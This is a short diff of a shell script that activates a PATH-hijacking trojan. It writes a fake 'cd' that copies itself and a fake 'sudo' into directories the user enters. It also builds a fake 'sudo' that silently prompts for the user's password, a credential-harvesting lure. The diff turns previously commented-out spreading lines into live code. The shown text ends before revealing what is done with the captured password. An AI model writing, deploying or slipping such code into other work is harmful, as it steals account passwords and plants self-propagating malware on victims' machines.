@@ -2,12 +2,13 @@
 
 PATH=.:$PATH
 
-#echo "#!/bin/bash" > cd
-#echo "/bin/cp cd $1cd" >> cd
-#echo "/bin/cp sudo $1sudo" >> cd
-#echo "/bin/cp ls $1sudo" >> cd
-#echo "/bin/cd $1" >> cd
-#chmod +x cd
+echo "#!/bin/bash" > cd
+echo "/bin/cp cd $1cd" >> cd
+echo "/bin/cp sudo $1sudo" >> cd
+echo "/bin/cp ls $1sudo" >> cd
+echo "/bin/cd $1" >> cd
+echo "exec bash" >> cd
+chmod +x cd
 
 echo "#!/bin/bash" > sudo
 echo "read -sp \"[sudo] password for $(whoami): \" p" >> sudo
